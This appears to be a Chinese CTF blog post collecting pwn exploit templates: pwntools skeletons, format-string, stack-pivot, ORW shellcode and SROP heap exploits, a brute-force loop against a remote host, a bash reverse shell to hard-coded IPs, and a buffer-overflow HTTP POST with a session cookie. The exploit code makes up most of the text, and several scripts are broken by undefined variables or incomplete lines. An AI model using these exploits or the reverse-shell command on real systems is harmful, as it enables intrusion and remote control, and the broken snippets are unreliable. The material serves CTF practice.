---
title: pwn题板子
date: 2023-01-06 00:28:59 +0800
categories: [ctf比赛]
tags: [pwn, ctf]
permalink: /posts/id=50/
pin: false
published:
---

## 基础模板

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","")
p = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

ia()
```

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","")
p = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(bytes(data))
sa      = lambda text,data          :p.sendafter(text, bytes(data))
sl      = lambda data               :p.sendline(bytes(data))
sla     = lambda text,data          :p.sendlineafter(text, bytes(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil(b"\xf7")[-4:].ljust(4,b"\x00"))
l64     = lambda                    :u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,b'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,b'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success(b'%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

ia()
```

精简版

```python
# _*_ coding:utf-8 _*_

from pwn import *
context.clear(arch='amd64', os='linux', log_level='debug')


p.interactive()
```



## 疑难杂症

### tips

```python
chr() # 16进制转字符
ord() # 字符转16进制
％.* s # 表示从以下缓冲区打印前X个字符
[rax] 取值
# 指针变量
	类型是int*
	p = p+1;# +8(1*int)
    赋值语句:赋给谁
    a = 3
    0x1234 a 0x0000003 0x0000000
    a变量地址 = 3

# 后三位置零(C语言)
stack_addr = stack_addr & (~0xfff);

# 关闭ALSR
echo 0 > /proc/sys/kernel/randomize_va_space

# 切换python版本
sudo update-alternatives --config python

# 本地patchelf
patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath ./ qwarmup
patchelf --set-interpreter ~/glibc-all-in-one/\libs/2.23-0ubuntu7_amd64/ld-linux-x86-64.so.2 --set-rpath ~/glibc-all-in-one/\libs/2.23-0ubuntu7_amd64/ ./pwn


# 虚拟机 vscode
sudo apt install openssh-server
service sshd start

# busybox
busybox mkdir -p /usr/bin
busybox --install -s /usr/bin

# ida使用技巧
shift+E # 导出数据

# 网络启动
sudo nmcli networking on

# /bin/sh
sh = 0x68732f6e69622f

# tor爬虫验证
curl --socks5 localhost:9150 --socks5-hostname localhost:9150 -s https://check.torproject.org/ | cat | grep -m 1 Congratulations | xargs

# 应用qiling环境
source ~/qilingenv/bin/activate

# 软连接
ln -s cgibin hedwig.cgi
hedwig,cgi-> cgibin

# ida 转 ascii码
选中区域按a

# 寻找为转化字符地址
扔进01editor搜索

# ida
用到了再更新
空格键 ：反汇编窗口切换文本跟图形
ESC退到上一个操作地址
G搜索地址或者符号
N重命名
分号键 ：注释
ALT+M 添加标签
CTRL+M 列出所有标签
CTRL +S 二进制段的开始地址结束地址
C code 光标地址出内容解析成代码
P 在函数开始处使用P，从当前地址处解析成函数
D data解析成数据
A ASCII解析成ASCII
U unDefined解析成未定义的内容
X 交叉引用
F5 C伪代码
菜单栏中的搜索功能中
有ALT+T 搜索文本
ALT+B 搜索16进制 搜索opcode 如ELF文件头
打开断点列表 CTRL+ALT+B
单步步入 F7
单步不过 F8
运行到函数返回地址 CTRL+F7
运行到光标处 F4

shift+E 导出数据，可提取一些数据
shift+? 计算器


# 后台运行 gohttpserver
sudo nohup ./gohttpserver -r ../share --port 80 1>/dev/null 2>&1 &
```





### hyper-V 和 VMware 切换

关闭hyper-V

wifi网络适配器右键取消桥接！

<img src="https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/ccfaeb528b034a12b43b5bc415d209e5.png" alt="在这里插入图片描述" style="zoom: 33%;" />

```bash
bcdedit /set hypervisorlaunchtype off
bcdedit /set hypervisorlaunchtype auto
```

启用hyper-V

新建外部虚拟网络

### 服务器nginx服务器

```bash
# 安装
sudo apt-get install nginx
# which nginx
# /usr/sbin/nginx -t
sudo nano /etc/nginx/conf.d/file_server.conf

server {
  listen 80; 
  server_name e4l4.com; # 自己PC的ip或者服务器的域名 
  charset utf-8; # 避免中文乱码 
  root /home/lighthouse/share; # 存放文件的目录 
  location / { 
    autoindex on; # 索引 
    autoindex_exact_size on; # 显示文件大小 
    autoindex_localtime on; # 显示文件时间 
  }
}

sudo rm /etc/nginx/sites-enabled/default
sudo service nginx reload


# 关于nginx的命令
sudo /etc/init.d/nginx start|stop|reload|
sudo service nginx start|stop|reload|

```



### docker命令

```bash
# 构建镜像：
docker build -f /path/Dockerfile -t imgname(tag)
docker images
docker run -itd --name ycbsql -p 9999:9999 ycbsql
docker ps

# 查看项目运行日志
docker logs --tail 500 ycbsql

docker exec -it 115e791688f1 "/bin/bash"
```

### 反向代理

iox 反向代理

```bash
./iox proxy -l 9999 -l 1080

./iox proxy -r e4l4.com:9999
iox.exe proxy -r e4l4.com:9999
```

frp反向代理

```shell
# 外网端
./frps -c frps.ini

# 内网端
./frpc -c frpc.ini
```





### gdb常用命令

```shell
# 设置寄存器
set $rax=0

```

### 栈对齐

```c
movaps xmmword ptr [rsp + 0x50], xmm0
```

使用 **XMM** 时，需要 **16Byte** 对齐；使用 **YMM** 时，需要 **32Byte** 对齐；使用 **ZMM** 时，需要 **64Byte** 对齐。



### docker 网桥删除

根据你提供的网络设备信息，你有很多 Docker 网络桥（br-02e7e9c790be，br-1df37dd21e5b，br-4e91b786b58e）以及一个默认的 Docker 网络桥（docker0）。要删除这些 Docker 网络桥，你可以使用 Docker 的命令行工具。

在 Docker 中，你可以使用 `docker network ls` 命令来查看所有的网络。你可以看到每个网络的 ID、名称、驱动和范围。然后你可以使用 `docker network rm` 命令来删除特定的网络。你需要用网络的 ID 或者名称作为参数。

例如，要删除一个名为 `my_network` 的网络，你可以运行以下命令：

```
docker network rm my_network
```

如果你想要删除所有的网络，你可以将 `docker network ls` 的输出（也就是所有网络的 ID）传递给 `docker network rm` 命令。下面是一个删除所有网络的 Bash 脚本：

```
docker network ls -q | xargs docker network rm
```

这个脚本首先会用 `docker network ls -q` 来获取所有网络的 ID，然后用 `xargs` 将这些 ID 作为参数传递给 `docker network rm`，从而删除所有的网络。

请注意，运行这个脚本需要 Docker 的相关权限。如果你在运行这个脚本时遇到了权限问题，你可能需要以管理员身份运行这个脚本。此外，如果一个网络正在被一个或多个容器使用，你需要先停止和删除这些容器，才能删除该网络。

## shellcode(汇编)



```
mov        一个变量或者寄存器， 一个变量或者寄存器里边的值
lea          一个变量或者寄存器,    一个变量或者寄存器


cdq    执行后rdx的值为0x00000000或0xFFFFFFFF  
#  字节码为"\x99" 表示“转换双字为四字” 在执行`cdq`指令时，它会检查`EAX`寄存器中的符号位（第31位），将eax扩展后的符号位复制到edx中

jmp $-0x19  # 短跳转 相对RIP

```





read()

```assembly
    mov rdi, r15
    xor eax, eax
    cdq
    mov al, 10
    mov dl, 7
    syscall # mprotect
    
    xor eax, eax
    mov esi, edi
    mov edi, eax
    mov dl, 0x7f
    syscall # read
    
# 添加nop
p.send('\x90' * 0x16 + asm('''
    mov rsp, rsi
    add rsp, 0x1000

    xor rsi, rsi
    mul rsi # rax = 0

    push rax
    mov rbx, 0x68732f2f6e69622f
    push rbx

    mov rdi, rsp
    mov al, 59

    syscall # execve("/bin/sh",0,0)
'''))
```







## 随机数调用

```python
# 随机数调用
from ctypes import *
libc1 = cdll.LoadLibrary('./libc-2.31.so')
libc1.srand(0)
j = str((libc1.rand()+1)%3)
```

## Z3解释器

```python
# _*_ coding:utf-8 _*_
from z3 import *

# 生成V3-V18变量
for i in range(3,19):
  locals()['v'+ str(i)]= Int('v%s'%i)

# x = Real('x') # 有理数

s = Solver()
s.add(v5 * v4 * v3 - v6 == 36182)
s.add(v3 == 19)
s.add(v5 * 19 * v4 + v6 == 36322)
s.add((v13 + v3 - v8) * v16 == 32835)
s.add((v4 * v3 - v5) * v6 == 44170)
s.add((v5 + v4 * v3) * v6 == 51590)
s.add(v9 * v8 * v7 - v10 == 61549)
s.add(v10 * v15 + v4 + v18 == 19037)
s.add(v9 * v8 * v7 + v10 == 61871)
s.add((v8 * v7 - v9) * v10 == 581693)
s.add(v11 == 50)
s.add((v9 + v8 * v7) * v10 == 587167)
s.add(v13 * v12 * v11 - v14 == 1388499)
s.add(v13 * v12 * v11 + v14 == 1388701)
s.add((v12 * v11 - v13) * v14 == 640138)
s.add((v11 * v5 - v16) * v12 == 321081)
s.add((v13 + v12 * v11) * v14 == 682962)
s.add(v17 * v16 * v15 - v18 == 563565)
s.add(v17 * v16 * v15 + v18 == 563571)
s.add(v14 == 101)
s.add((v16 * v15 - v17) * v18 == 70374)
s.add((v17 + v16 * v15) * v18 == 70518)


if s.check() == sat:
  result = s.model()
  print result

```



## fmt



### 栈上

```python
# fmtstr_payload
payload ="%2c%310$hhn;%310$p".ljust(0x18)# 修改栈上的某个值为2/泄露libc
payload += fmtstr_payload(9,{ret_addr:start}, numbwritten=0x17)# 修改返回地址为start


# 第一个参数：fmtstr开始的地方的偏移(题目输入偏移是6，fmtstr_payload开始的地方偏移是9)
# 第二个参数：ret_addr : aaa -> bbb  将aaa改为start
# 第三个参数：numbwritten: fmtstr_payload用%c构成读入字节数，这里fmtstr_payload前边有内容所以要剪掉字节长，%2c为2字节,0x17 = 0x18-1

```



### 堆上

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("127.0.0.1","10000")
p = process("./shell")
elf = ELF("./shell")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

# 泄露libc和栈地址
sa("> ",'echo '+'%6$p-%10$p')
sa("> ",'cat')
ru('0x')
libc_base = int(p.recv(12),16)-libc.sym['_IO_file_jumps']
lg('libc_base')
one = libc_base + 0xe3b01 
lg('one')
ru('0x')
stack_addr= int(p.recv(12),16)
lg('stack_addr')
ret = stack_addr+0x8
lg('ret')

# aaa(%17$p) : bbb(%45$p) -> ccc 
# aaa(%17$p) : bbb(%45$p) -> ret -> libc_function
# 改aaa的偏移即改ccc

sa("> ",'echo '+'%' + str(ret & 0xffff) + 'c%17$hn')
sa("> ",'cat')

sa("> ",'echo '+'%' + str(one & 0xffff) + 'c%45$hn')
sa("> ",'cat')

sa("> ",'echo '+'%' + str((ret+2) & 0xffff) + 'c%17$hn')
sa("> ",'cat')

sa("> ",'echo '+'%' + str(one>>16 & 0xff) + 'c%45$hhn')
sa("> ",'cat')

sa("> ",'exit\n')

ia()
```

### bss上

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

p = remote('node4.buuoj.cn', 29966) 
# p = process("./playfmt")
elf = ELF("./playfmt")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

buf = 0x804A060+0x4
shellcode = asm(shellcraft.i386.linux.sh())

sl("%6$p")
ru("0x")
stack = int(p.recv(8),16)
lg('stack')
ret = stack-0xc

pay = '%' + str(ret & 0xff) + 'c%6$hhn'
pay = pay.ljust(200,'\x00')
s(pay)

pay = '%' + str(buf & 0xffff) + 'c%10$hn'
pay = pay.ljust(200,'\x00')
s(pay)

pay = 'quit' + shellcode
s(pay)

ia()
```







## orw

orw-shellcode 汇编

```python
nop #1字节
pop rdi # 1字节
xor esi, esi #2字节
xor rsi, rsi #3字节
sub rsp, 0x30 #4字节
jmp rsp #2字节
mov rax, 0 #7字节 
mov eax, 0 #5字节
syscall #2字节

orw_shellcode = '''
    mov eax, 0x67616c66 ;// flag
    push rax

    mov rdi, rsp
    xor eax, eax
    mov esi, eax
    mov al, 2
    syscall ;// open

    push rax
    mov rsi, rsp
    xor eax, eax
    mov edx, eax
    inc eax
    mov edi, eax
    mov dl, 8
    syscall ;// write open() return value

    pop rax
    test rax, rax
    js over

    mov edi, eax
    mov rsi, rsp
    mov edx, 0x01010201
    sub edx, 0x01010101
    xor eax, eax
    syscall ;// read

    mov edx, eax
    mov rsi, rsp
    xor eax, eax
    inc eax
    mov edi, eax
    syscall ;// write

over:
    xor edi, edi
    mov eax, 0x010101e8
    sub eax, 0x01010101
    syscall ;// exit
'''
sl(asm(orw_shellcode))
```

### 栈迁移/orw_shellcode

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","")
# p = process('./ld-2.33.so ./TinyNote'.split(),env={'LD_PRELOAD':'./libc-2.33.so'})
p = process("./heap2019")
elf = ELF("./heap2019")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
# context.terminal = ['cmd.exe', '/c', 'wt.exe', '-w', '0','--title', 'gdb', 'bash', '-c']
context.terminal = ['tmux', 'splitw', '-hp','60']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

pop_rdi = 0x0000000000401393
pop_rsi = 0x0000000000401391
ret = 0x000000000040101a

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

read = 0x4012CF
main = 0x4012C0
bss = 0x404200
#-------------------泄露libc-------------------------
# 如果一点都不够就直接栈迁移，泄露以后再继续栈迁移
ru("before you try to solve this task.")
pay = 'a'*0x100+p64(bss)+p64(read)
s(pay)
pay = 'a'*0x100+p64(bss+0x100)+p64(read)
s(pay)
pay = p64(0)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
s(pay)

# 如果有一定空间（>=0x20）可实现栈迁移
pay = 'a'*0x20+p64(bss)+p64(pop_rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(read)
s(pay)
pay = 'a'*0x20+p64(bss+0x20)+p64(read)
s(pay)# 后续就可以orw或者mprotect改权限


# 如果仅有read函数的情况



libc_base = l64()-0x
lg('libc_base')
pop_rdx = libc_base + 0x0000000000142c92
jmp_rsp = libc_base+0x0000000000002b25
Open = libc_base+libc.sym['open']
Read = libc_base+libc.sym['read']
Write = libc_base+libc.sym['write']
# 二选一
# mprotect = libc_base + libc.sym['mprotect']
# syscall = libc_base + 0xd2625

flag = 'flag'
pay = p64(0)+p64(pop_rdi)+p64(bss-0x500)
pay += p64(pop_rsi)+p64(0x1000)
pay += p64(pop_rdx)+p64(7)
pay += p64(pop_rax)+p64(10)
pay += p64(syscall)
pay += p64(jmp_rsp)
pay += asm('''
        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;
        ''' % (bss+0x100))# read(0,rsi,0x100);jmp rsi
ru("let me guess\n")
s(payload)

# 可用的shellcode
# get flagname
pay = asm(shellcraft.open('./'))
pay += asm(shellcraft.getdents64(3, bss+0x300, 0x100))
pay += asm(shellcraft.write(1, bss+0x300, 0x100))
pay += asm('''
        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;
        ''' % (main))# 等价于call main
s(pay)
ru("flag")
flagname='flag'+p.recv(20)
print(flagname)

# cat flag 1
flag = 'flag'
pay = asm(shellcraft.cat(flag))
pay += asm('''
        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;
        ''' % (bss+0x100))# read(0,rsi,0x100);jmp rsi
s(pay)
# cat flag 2
pay += asm(shellcraft.open((flagname)))
pay += asm(shellcraft.read(3, bss+0x700, 0x400)) # pay += shellcraft.read(3,'rsp',0x100)
pay += asm(shellcraft.write(1,bss+0x700, 0x400)) # pay += shellcraft.write(1,'rsp',0x100)
pay += asm('''
        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;
        ''' % (main))
s(pay)

#--------------------直接orw----------------------
flag = 0x404200
pay = 'flag'.ljust(8,'\x00')+p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(0)*2+p64(pop_rdx)+p64(0)+p64(Open)
pay += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(0x404200)+p64(0)+p64(pop_rdx)+p64(0x30)+p64(Read)
pay += p64(pop_rdi)+p64(1)+p64(Write)
sl(pay)

ia()
```

### orw涉及到堆，就需要srop来free_hook段改权限实现orw

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","")
# p = process('./ld-2.33.so ./TinyNote'.split(),env={'LD_PRELOAD':'./libc-2.33.so'})
p = process("./heap2019")
elf = ELF("./heap2019")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
# context.terminal = ['cmd.exe', '/c', 'wt.exe', '-w', '0','--title', 'gdb', 'bash', '-c']
context.terminal = ['tmux', 'splitw', '-hp','60']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

def add(size):
    sla("4.show\n",'1')
    sla("Size of Heap : \n",size)

def dele(idx):
    sla("4.show\n",'2')
    sla("Index :\n",idx)

def edit(idx,size,con):
    sla("4.show\n",'3')
    sla("Index :\n",idx)
    sla("Size of Heap : \n",size)
    sa("Content of heap : \n",con)
def show(idx):
    sla("4.show\n",'4')
    sla("Index :\n",idx)

#------------------------泄露libc------------------------------
# 堆的思路比较复杂,首先利用漏洞点泄露libc
pop_rdi = libc_base+libc.search(asm("pop rdi\nret")).next()
pop_rsi = libc_base+libc.search(asm("pop rsi\nret")).next()
pop_rdx = libc_base+libc.search(asm("pop rdx\nret")).next()
pop_rax = libc_base+libc.search(asm("pop rax\nret")).next()
jmp_rsp = libc_base+libc.search(asm("jmp rsp")).next()
syscall = libc_base+libc.search(asm("syscall\nret")).next()
mprotect = libc_base + libc.sym['mprotect']

# mov rax, dword ptr [rdi + 0x20]; mov rbp, rdi;test rax, rax; je 0x34fe3; call rax;跳转至rdi+0x20
gadget = libc_base+0x0000000000034fd5
free_hook_base = (libc_base+libc.sym["__free_hook"]) & 0xfffffffffffff000
pop3_ret = libc_base+0x00000000000e6ce5
leave_ret = libc_base+0x000000000005a9a8
pop_rsp = libc_base+0x000000000002709c
# 劫持free_hook-0xa0,写入
pay  = p64(0)+p64(pop3_ret)+p64(0)*2+p64(leave_ret)#<-开始执行
pay += p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(free_hook_base)
pay += p64(pop_rdx_r12)+p64(0x1000)*2+p64(pop_rax)+p64(0)
pay += p64(syscall)# read
pay += p64(pop_rsp)+p64(free_hook_base)# jmp rsp
pay  = payload.ljust(0xa0,"\x00")
# print len(pay)
pay += p64(gadget)
sla(">>",pay)

pay = p64(pop_rdi)+p64(free_hook_base)+p64(pop_rsi)+p64(0x2000)# mprotect改free_hook段的权限执行shellcode
pay += p64(pop_rdx_r12)+p64(7)+p64(7)+p64(pop_rax)+p64(10)+p64(syscall)+p64(free_hook_base+0x70)
sc  = shellcraft.open("flag");
sc += shellcraft.read(3,free_hook_base+0x300,0x100)
sc += shellcraft.write(1,free_hook_base+0x300,0x100)

sl(pay.ljust(0x70,"\x00")+asm(sc))
#--------------------------------------------------------------
# mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]; SROP+setcontext
gadget = libc_base+0x0000000000034fd5
free_hook_base = (libc_base+libc.sym["__free_hook"]) & 0xfffffffffffff000
setcontext = libc_base+libc.sym['setcontext']+61
frame = SigreturnFrame()# 这个框架的地址要赋给rdx
frame.rsp = libc_base + libc.sym['__free_hook']+0x10# 2
frame.rdi = free_hook_base
frame.rsi = 0x1000
frame.rdx = 7
frame.rip = libc_base + libc.sym['mprotect']# 1

# 劫持到free_hook-0x150,写入
frame_addr = libc_base+libc.sym["__free_hook"]-0x150+0x10
pay = p64(0)+p64(frame_addr)+p64(0)*4+p64(setcontext)+str(frame)[0x28:]# 0x28正好补齐即从+0x10开始
pay = payload.ljust(0x150,'\x00')
pay += p64(gadget)
pay += p64(0)+p64(libc_base+libc.sym["__free_hook"]+0x18)#2
pay += asm('''
        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;
        ''' % (free_hook_base))
sla(">>",pay)

dele(free_hook-0x150)# *
# orw
sc = asm(shellcraft.cat('flag'))
sc += asm('''
        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;
        ''' % (free_hook_base+0x100))
s(sc)
ia()
```



## 爆破脚本

如果是覆盖返回地址得爆破

```python
count=1

while true :
        p=remote("nc.eonew.cn",10002)
        p.send('A'*0x80+'A'*8+'\xa6\x15\x04') #注意不能用sendline否则会读取'\n'
        p.recv()
        print(count)
        count += 1
        try:    
               p.recv(timeout=0.2)# [*] Got EOF while reading in interactive 转化为 Traceback
               p.recv(timeout=0.2)
        except:
               p.close()
               continue
        break
ia()
```





## web Pwn

```python
# 创建反向 shell ，并将其输入和输出都重定向到一个远程服务器
cmd = 'bash -c "bash -i >& /dev/tcp/39.102.55.191/9999 0>&1"\x00'
sh -c "sh -i >& /dev/tcp/150.158.144.112/1234 0>&1"\x00
# nc -lvvp 1234
```

发包

```python
from pwn import *
import requests

cookies = {
    'session': 'eyJ1c2VybmFtZSI6Ims0bjk2NiJ9.ZI_LbQ.56KQg3j3spZksRCrTnhkoOu3238',
}

headers = {
    'Accept': '*/*',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
    'Cache-Control': 'max-age=0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://94.74.101.210:50644',
    'Proxy-Connection': 'keep-alive',
    'Referer': 'http://94.74.101.210:50644/',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
}


vip = 0x401129
main = 0x400FF9
payload = b'a'.ljust(0xe8,b'a') + p64(vip) + p64(main)

response = requests.post('http://94.74.101.210:50644/vip.cgi', headers=headers, cookies=cookies, data=payload, verify=False)


print(response.text)
```



## Protobuf





```
//ctf.proto


syntax = "proto2";

package ctf;

message pwn {
    optional bytes username = 1;
    optional bytes password = 2;
}
```





```shell
// protoc --python_out=./ ./ctf.proto
// ctf.proto        to      ctf_pb2.py

# -*- coding: utf-8 -*-
# Generated by the protocol buffer compiler.  DO NOT EDIT!
# source: ctf.proto
"""Generated protocol buffer code."""
from google.protobuf import descriptor as _descriptor
from google.protobuf import descriptor_pool as _descriptor_pool
from google.protobuf import symbol_database as _symbol_database
from google.protobuf.internal import builder as _builder
# @@protoc_insertion_point(imports)

_sym_db = _symbol_database.Default()




DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(b'\n\tctf.proto\x12\x03\x63tf\")\n\x03pwn\x12\x10\n\x08username\x18\x01 \x01(\x0c\x12\x10\n\x08password\x18\x02 \x01(\x0c')

_globals = globals()
_builder.BuildMessageAndEnumDescriptors(DESCRIPTOR, _globals)
_builder.BuildTopDescriptorsAndMessages(DESCRIPTOR, 'ctf_pb2', _globals)
